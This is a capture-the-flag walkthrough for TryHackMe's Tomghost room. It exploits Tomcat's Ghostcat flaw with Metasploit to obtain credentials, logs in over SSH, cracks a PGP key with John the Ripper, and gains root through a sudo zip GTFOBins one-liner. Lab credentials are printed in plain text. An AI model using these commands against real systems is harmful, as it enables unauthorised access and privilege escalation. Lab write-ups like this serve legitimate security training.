# Tomghost Room Walkthrough

Link: [TryHackMe Tomghost Room](https://tryhackme.com/r/room/tomghost)

---

## 1. Scanning Ports

### Initial Scan with Rustscan
Start by using `Rustscan` to quickly identify open ports:

```bash
rustscan -a 10.10.XX.XX
```
![Screenshot 2025-01-20 200231](https://github.com/user-attachments/assets/81ae0c69-bab5-4ab7-a3e4-552d87898a1a)

We will find 4 ports open:

```bash
22,53,8009,8080
```

### Deep Scan with Nmap
Use `Nmap` for a more detailed scan of the identified ports:

```bash
nmap -A -p 22,53,8009,8080 10.10.XX.XX
```
![Screenshot 2025-01-20 201436](https://github.com/user-attachments/assets/a1d40883-ac1b-4057-8cc7-dd1d194ff6f3)

- We found an HTTP page available here.
- I also tried to exploit each port, but it didn't lead anywhere.
- I also tried to enumerate the page on port 8080 with Ffuf. I found the manager page, but we don't have access to it.
![Screenshot 2025-01-20 202700](https://github.com/user-attachments/assets/bdff35f3-8bb5-45f5-a4c4-75f2f37901c9)

So, I tried to find any exploit for the page version Tomcat 9.0.30.

---

## 2. Enumerating Apache Tomcat

I used Metasploit to find any exploit for it. By searching with `Tomcat 9.0.`, I found:

```bash
auxiliary(admin/http/tomcat_ghostcat)
```
I used it to see where it would lead.
![Screenshot 2025-01-20 185500](https://github.com/user-attachments/assets/20e6b74f-e0e3-402f-9ab9-cffa841c4f52)

![Screenshot 2025-01-20 185629](https://github.com/user-attachments/assets/8e76eeba-051d-4fba-9999-ec89a1c1929b)

We found a username and password:

```bash
skyfuck:8730281lkjlkjdqlksalks
```

So, I tried to log in to SSH with these credentials, and I succeeded.

I found there are 2 files. I downloaded the 2 files with:

```bash
scp skyfuck@10.10.232.53:tryhackme.asc .
scp skyfuck@10.10.232.53:credential.pgp .
```
![Screenshot 2025-01-20 210231](https://github.com/user-attachments/assets/0e9d757e-b26e-4d9e-b3bc-c9aed5f178a5)

After reading the 2 files, I found that they are encrypted credentials. I searched on Google and found that we can decrypt the `.asc` file with John the Ripper using `gpg2john`.
![Screenshot 2025-01-20 212602](https://github.com/user-attachments/assets/8eea2de6-1249-423a-8f03-bf7c4a519bca)

```bash
gpg2john tryhackme.asc > crack

john --wordlist=/usr/share/wordlists/rockyou.txt crack
```

And we got the credential file password:

```bash
alexandru
```
![Screenshot 2025-01-20 190610](https://github.com/user-attachments/assets/0f6fce23-b747-4478-8aa2-5289982f2516)

Now, let's find the secrets in the files using:

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp 
```

(We are going to use the pass for each file.)
![Screenshot 2025-01-20 190959](https://github.com/user-attachments/assets/7889a095-98b5-4f83-a9ec-0ea8e4375d76)

And we will get Merlin's password:

```bash
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

Now, we can log in with SSH using these credentials.
![Screenshot 2025-01-20 191202](https://github.com/user-attachments/assets/7eb6af49-c3bf-4f19-9122-0e3cca47edf8)

---

## 4. Privilege Escalation

### Enumerating Sudo Commands
Check for commands with the sudo bit set:

```bash
sudo -l
```
![Screenshot 2025-01-20 191359](https://github.com/user-attachments/assets/97ca32f1-3da2-4642-8191-5054dbd4cfa1)

Here, we found the `zip` command working with sudo. Let's look on the GTFOBins site to see if there is any vulnerability in the `zip` command.
Refer to [GTFOBins](https://gtfobins.github.io/).

![Screenshot 2025-01-20 191726](https://github.com/user-attachments/assets/59126c17-4099-4a34-a81f-1ef06e0419dc)

We found a vulnerability with `zip`, so let's try the script to see if we can get root:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
![Screenshot 2025-01-20 191858](https://github.com/user-attachments/assets/56237acd-e4cf-4d9b-9571-da6fda27e823)

And voilà, WE ARE ROOT :)!

[Use this script to get a TTY bash shell if you like]

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

---

## 7. Conclusion

By completing the challenge, we demonstrated the ability to:

- Enumerate and exploit Apache Tomcat.
- Extract credentials and use them to access the system.
- Escalate privileges to root using a vulnerability in the `zip` command.





**HAPPY HUNTING!! :)**
